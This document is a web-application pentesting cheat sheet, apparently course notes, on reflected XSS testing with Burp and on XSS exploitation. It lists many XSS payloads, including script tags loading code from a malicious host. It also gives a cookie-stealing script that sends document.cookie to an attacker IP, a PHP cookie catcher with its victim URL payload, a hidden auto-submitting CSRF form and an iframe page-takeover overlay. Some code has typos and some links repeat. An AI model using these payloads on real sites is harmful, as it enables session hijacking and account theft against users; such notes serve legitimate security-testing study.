---
title: XSS and Javascript
category: Web Application
order: 5
---

> **XSS Reflection Testing**

**Using Burp - Step 1:** 
1. Intruder-> Battering Ram (include user-agent, referer, cookie values)
2. Payoad -> Use a magic string: 9vqkz (any random string)
3. Options -> Search responses for payload strings -> magic string
4. Sort on p grep, if found change attack type to sniper.

**Using Burp - Step 2 Filter Test:**
1. Repeat above with sniper and the following payloads (simple list):
* <code> &lt;&gt;[]{}()$--'#&#34;&amp;;/ </code>
* <code> '';!--"<XSS>=&{()} </code>
* <code> <x>'"()= </code>
* <code> ;[]{}'"() </code>
* <code> jAvaSCript:prompt(9vqkz) </code>
* <code> <script>alert(42);</script> </code>

**Additional Payloads:**
* Fuzzdb /attack-payloads/xss
* JBroFuzz (built into ZAP)
* Burp (Pro provides expanded payloads)
* ZAP (JBroFUzz and some fuzzdb)
* XSSer (includes some that the others don't have)

**Additional XSS Test Strings**
{% highlight html %}
<script>alert(document.cookie);</script>
<script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>
<script src=http://www.example.com/malicious-code.js></script>
%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e
\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
>"><script>alert("XSS")</script>&
"><STYLE>@import"javascript:alert('XSS')";</STYLE>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')> 
<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
{% endhighlight %}

**Tools:**
* XSSer 
* xssniper
* XSScrapy (xsssniper -u "http://sec542.com" --crawl --forms -http-proxy 127.0.0.1:8082)

**Resources:**
* [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

> **Javascript Events for XSS**

onload | change content after it loads
onunload | launch pop-under window to retain control of a zombie browser
onsubmit | change form values os the transaction is one of the attacker's choosing
onfocus | send http request to the attacker's web server to reveal which controls the user is selecting

> **XSS Exploitation**

**Exploitation Options**
* Redirect to competitor (or other equivantly bad site) 
	* <code> window.location.href = "http://www.sec542.org" ; </code>
* Have form submit to you:
	* <code> document.forms[1].action="http://www.sec542.org" </code>
* Add Competitor logo
* Negative fake information (or other content modification)
* Read cookies
* Fake Login Site 

**Basic Stealing Cookie:**
{% highlight html %}
#Attacker
python -m SimpleHTTPServer 

#Victim
<script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+docment.cookie;</script>
{% endhighlight %}

POST:
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">
<input type="hidden" name="<paramater>" value="<value>"/>
<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
       tabindex="-1"/>
</form>
<script>document.getElementById('CSRF').submit();</script>
{% endhighlight %}

**XSS Cookie Catcher**
{% highlight php %}

#Attacker
<?php
$cookies = $_SERVER['REQUEST_URI'];
$output = "Received=".$cookies."\n";
$fh = fopen("/tmp/cookiedump", "a+");
$contents = fwrite($fh, $output);
fclose($fh);
echo "FOO!";
?>

#Victim
http://www.sec542.org/PhpMyAdmin/index.php?lang=<script>var lo=document.location;document.location='//[AttackerIP]/cookiecatcher.php?'%2bdocument.cookie;var la = new Array();la = lo.toString().split('?');document.location=la[0];</script>
"
{% endhighlight %}

**Take Over a Page**
{% highlight html %}
<style type="text/css"> <! -- .style11 {position:fixed; top:0px; left:0px; bottom:0px; right:opx; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;} //-->
</style>

<iframe class="style11" src="http://127.127.127.127/www.sans.org/account/" frameborder="0" scrolling="no" />
{% endhighlight %}

> **Useful Resources**

* [MongoDB](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [Command Injection](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [Fuzzing List](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors)
* 
* [XSS Examples](http://www.xssed.com/)
* [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)
* [Access Injection Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
[Commix](http://www.kitploit.com/2015/04/commix-automated-all-in-one-os-command.html)
[LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)
[CGI-Bin](https://www.hellboundhackers.org/articles/read-article.php?article_id=7)

> **Useful Tools**
* [SQLMap](http://sqlmap.org)

